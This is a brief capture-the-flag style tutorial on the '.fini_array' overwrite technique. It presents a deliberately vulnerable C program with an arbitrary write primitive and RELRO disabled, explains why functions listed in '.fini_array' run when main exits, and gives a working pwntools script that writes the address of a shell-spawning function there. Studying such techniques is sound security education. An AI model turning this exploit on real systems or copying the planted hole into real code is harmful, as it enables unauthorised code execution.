# `fini_array`

Here's a really basic program:

```c
#include<stdio.h>
void win(){
    system("/bin/sh");
}
int main(){
    long addr;
    long val;
    scanf("%ld %ld",&addr,&val);
    *(long*)addr = val;
    return 0;
}
```

Full stack protectors:

`gcc chal.c -o chal -no-pie  -fstack-protector-all -Wl,-z,norelro`

It takes in a value and an address and writes the value to the address. We may try a multitude of attacks involving GOT overwrites or ROP, but these attacks are infeasible due to the simplicity of the program.

Fortunately, the program has RELRO disabled, so we can write anywhere. If RELRO is enabled, writing to `.fini_array` would segfault.

One great place to write stuff is the `.fini_array` section. When `main` exits, 

> The runtime linker executes functions whose addresses are contained in the `.fini_array` section.

http://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/index.html

This is great! We just need to write the address of `win` into `.fini_array` and we can get a shell

## Exploit

```python
from pwn import *
from binascii import *
from ctflib.pwn import *

p = process("./chal")
e = ELF("./chal")
context.binary = e

fini_addr = get_section_address(e, ".fini_array")
p.sendline(str(fini_addr).encode()+b" "+str(e.sym.win).encode())
p.interactive()
```

